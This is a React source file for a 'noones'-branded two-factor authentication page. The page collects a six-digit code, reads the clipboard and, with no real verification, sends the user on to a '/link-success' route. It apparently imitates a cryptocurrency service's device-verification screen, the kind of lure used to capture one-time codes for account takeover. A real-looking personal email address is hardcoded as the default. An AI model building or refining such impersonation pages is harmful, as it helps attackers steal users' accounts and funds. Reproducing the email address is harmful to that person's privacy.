import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { Sun, Moon, ChevronDown, ExternalLink } from 'lucide-react';

export default function NoonesDeviceVerification() {
  const navigate = useNavigate();
  const location = useLocation();
  const [code, setCode] = useState(['', '', '', '', '', '']);
  const [resendTimer, setResendTimer] = useState(54);
  const [isDarkMode, setIsDarkMode] = useState(false);
  const [language, setLanguage] = useState('English');
  const [showLanguageDropdown, setShowLanguageDropdown] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const email = location.state?.email || 'gibsonkobia@gmail.com';

  // Timer countdown
  useEffect(() => {
    if (resendTimer <= 0) return;
    const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000);
    return () => clearTimeout(timer);
  }, [resendTimer]);

  const handleCodeChange = (index: number, value: string) => {
    // Only allow digits
    if (!/^\d*$/.test(value)) return;

    const newCode = [...code];
    newCode[index] = value.slice(0, 1); // Only one digit per box
    setCode(newCode);

    // Auto-focus to next input
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !code[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = async () => {
    try {
      const clipboardText = await navigator.clipboard.readText();
      const digits = clipboardText.replace(/\D/g, '').slice(0, 6);
      
      if (digits.length > 0) {
        const newCode = [...code];
        for (let i = 0; i < Math.min(digits.length, 6); i++) {
          newCode[i] = digits[i];
        }
        setCode(newCode);
        
        // Focus last input or next empty input
        if (digits.length < 6) {
          inputRefs.current[digits.length]?.focus();
        } else {
          inputRefs.current[5]?.focus();
        }
      }
    } catch (err) {
      console.error('Failed to read clipboard:', err);
    }
  };

  const handleResend = () => {
    setResendTimer(54);
    setCode(['', '', '', '', '', '']);
    inputRefs.current[0]?.focus();
    // TODO: Implement resend code logic
  };

  const handleContinue = async () => {
    const verificationCode = code.join('');
    if (verificationCode.length !== 6) {
      alert('Please enter all 6 digits');
      return;
    }

    try {
      // TODO: Verify code with backend
      navigate('/link-success');
    } catch (err) {
      alert('Verification failed. Please try again.');
    }
  };

  const isComplete = code.every((digit) => digit !== '');
  const bgColor = isDarkMode ? 'bg-[#0f0f0f]' : 'bg-[#f8f9fa]';
  const textColor = isDarkMode ? 'text-white' : 'text-gray-900';

  return (
    <div className={`${bgColor} min-h-screen flex flex-col items-center justify-center p-4 font-sans transition-colors duration-300`}>
      {/* Main Card */}
      <div className={`w-full max-w-[450px] ${isDarkMode ? 'bg-[#1e1e1e]' : 'bg-white'} rounded-xl shadow-md p-8 sm:p-10`}>
        {/* Logo */}
        <div className="text-center mb-8">
          <h1 className="text-3xl font-bold text-[#00c281]">noones</h1>
        </div>

        {/* Title */}
        <h2 className={`text-2xl font-bold text-center ${textColor} mb-2`}>
          Two-factor authentication
        </h2>

        {/* Subtitle */}
        <p className={`text-center ${isDarkMode ? 'text-gray-500' : 'text-gray-600'} mb-8`}>
          Enter 6-digit code sent to{' '}
          <span className={`font-medium ${isDarkMode ? 'text-gray-300' : 'text-gray-900'}`}>
            {email}
          </span>
        </p>

        {/* Code Input Grid */}
        <div className="flex justify-center gap-3 mb-6">
          {code.map((digit, index) => (
            <input
              key={index}
              ref={(el) => (inputRefs.current[index] = el)}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={digit}
              onChange={(e) => handleCodeChange(index, e.target.value)}
              onKeyDown={(e) => handleKeyDown(index, e)}
              className={`w-12 h-16 text-center text-xl font-bold rounded-lg outline-none transition-all ${
                isDarkMode
                  ? `${digit ? 'bg-[#2a2a2a]' : 'bg-[#e9ecef]'} text-white border-2 border-transparent`
                  : `${digit ? 'bg-[#e9ecef]' : 'bg-[#e9ecef]'} text-gray-900 border-2 border-transparent`
              }`}
              placeholder="—"
              autoComplete="off"
            />
          ))}
        </div>

        {/* Paste Button */}
        <div className="flex justify-center mb-6">
          <button
            onClick={handlePaste}
            className={`px-4 py-2 rounded-full text-sm font-medium transition-colors ${
              isDarkMode
                ? 'bg-[#2a2a2a] hover:bg-[#333333] text-gray-300'
                : 'bg-[#f1f3f5] hover:bg-[#e9ecef] text-gray-700'
            }`}
          >
            Paste
          </button>
        </div>

        {/* Timer */}
        <p className={`text-center text-sm mb-8 ${isDarkMode ? 'text-gray-500' : 'text-gray-600'}`}>
          Resend in {resendTimer} seconds
        </p>

        {/* Continue Button */}
        <button
          onClick={handleContinue}
          disabled={!isComplete}
          className={`w-full h-12 rounded-lg font-semibold transition-all mb-6 ${
            isComplete
              ? isDarkMode
                ? 'bg-[#00c281] hover:bg-[#00b873] text-white cursor-pointer'
                : 'bg-[#00c281] hover:bg-[#00b873] text-white cursor-pointer'
              : isDarkMode
              ? 'bg-[#2a2a2a] text-gray-500 cursor-not-allowed'
              : 'bg-[#e9ecef] text-gray-400 cursor-not-allowed'
          }`}
        >
          Continue
        </button>

        {/* Support Link */}
        <p className={`text-center text-sm ${isDarkMode ? 'text-gray-500' : 'text-gray-600'}`}>
          If you need to reset 2FA, please{' '}
          <a href="#support" className="text-[#00c281] hover:underline font-medium inline-flex items-center gap-1">
            contact support <ExternalLink size={12} className="inline" />
          </a>
        </p>
      </div>

      {/* Footer Controls */}
      <div className="w-full max-w-[450px] flex justify-between items-center mt-8 px-4">
        {/* Theme Toggle */}
        <div
          className={`flex items-center gap-2 p-2 rounded-full cursor-pointer transition-colors ${
            isDarkMode
              ? 'bg-[#1e1e1e] hover:bg-[#2a2a2a]'
              : 'bg-gray-100 hover:bg-gray-200'
          }`}
          onClick={() => setIsDarkMode(!isDarkMode)}
        >
          <Sun
            size={18}
            className={`transition-colors ${
              isDarkMode ? 'text-gray-600' : 'text-yellow-500'
            }`}
          />
          <div
            className={`w-10 h-5 rounded-full transition-all ${
              isDarkMode ? 'bg-[#00c281]' : 'bg-gray-300'
            } relative`}
          >
            <div
              className={`absolute top-0.5 w-4 h-4 bg-white rounded-full transition-all ${
                isDarkMode ? 'right-0.5' : 'left-0.5'
              }`}
            />
          </div>
          <Moon
            size={18}
            className={`transition-colors ${
              isDarkMode ? 'text-gray-400' : 'text-gray-400'
            }`}
          />
        </div>

        {/* Language Selector */}
        <div className="relative">
          <button
            onClick={() => setShowLanguageDropdown(!showLanguageDropdown)}
            className={`flex items-center gap-2 px-3 py-2 rounded transition-colors ${
              isDarkMode
                ? 'text-gray-400 hover:text-gray-200'
                : 'text-gray-600 hover:text-gray-900'
            }`}
          >
            <span className="text-sm font-medium">{language}</span>
            <ChevronDown size={16} />
          </button>

          {showLanguageDropdown && (
            <div
              className={`absolute top-full right-0 mt-1 rounded shadow-lg z-10 ${
                isDarkMode ? 'bg-[#1e1e1e]' : 'bg-white'
              }`}
            >
              {['English', 'Spanish', 'French', 'German'].map((lang) => (
                <button
                  key={lang}
                  onClick={() => {
                    setLanguage(lang);
                    setShowLanguageDropdown(false);
                  }}
                  className={`block w-full text-left px-4 py-2 text-sm transition-colors ${
                    language === lang
                      ? isDarkMode
                        ? 'bg-[#00c281] text-white'
                        : 'bg-[#00c281] text-white'
                      : isDarkMode
                      ? 'text-gray-300 hover:bg-[#2a2a2a]'
                      : 'text-gray-700 hover:bg-gray-100'
                  }`}
                >
                  {lang}
                </button>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
